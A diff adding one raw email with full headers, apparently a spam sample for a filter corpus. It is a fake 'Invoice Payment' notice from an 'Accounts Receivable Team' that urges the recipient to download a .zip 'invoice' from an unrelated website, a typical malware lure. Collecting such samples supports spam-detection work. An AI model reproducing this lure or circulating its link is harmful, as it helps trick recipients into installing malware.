@@ -1,0 +1,36 @@
+Delivered-To: bruce@bruce-guenter.dyndns.org
+Received: (qmail 17692 invoked from network); 23 Jan 2014 08:53:53 -0000
+Received: from localhost (localhost [127.0.0.1])
+  by bruce-guenter.dyndns.org ([192.168.1.2]); 23 Jan 2014 08:53:53 -0000
+Received: from zak.futurequest.net ([127.0.0.1])
+  by localhost ([127.0.0.1])
+  with SMTP via TCP; 23 Jan 2014 08:53:53 -0000
+Received: (qmail 31108 invoked from network); 23 Jan 2014 08:53:52 -0000
+Received: from [31.24.139.48] ([31.24.139.48])
+  by zak.futurequest.net ([69.5.6.152])
+  with ESMTP via TCP; 23 Jan 2014 08:53:52 -0000
+﻿Received: from 10.1.0.35 ([10.1.0.35])
+Message-ID: <345A5ED5CD0647E5AB4F1764A5F139A3@weestydom>
+From: "Accounts Receivable Team" <pat@handicapaids.net>
+To: "Consumer" <bruce@bruce-guenter.dyndns.org>
+Subject: Invoice Payment
+Date: Thu, 23 Jan 2014 09:50:21 +0200 (EEST)
+MIME-Version: 1.0
+Content-Type: text/plain;
+	format=flowed;
+	charset="iso-8859-1";
+	reply-type=original
+Content-Transfer-Encoding: 7bit
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook Express 6.00.2900.5931
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.6109
+
+Hello, Consumer
+We have obtained your order and will be processing it shortly.
+You can find the invoice here:
+http://www.rmtunisie.tn/2014/bill/bl3565767.2014.zip
+Good-bye
+Accounts Receivable Team
+
+
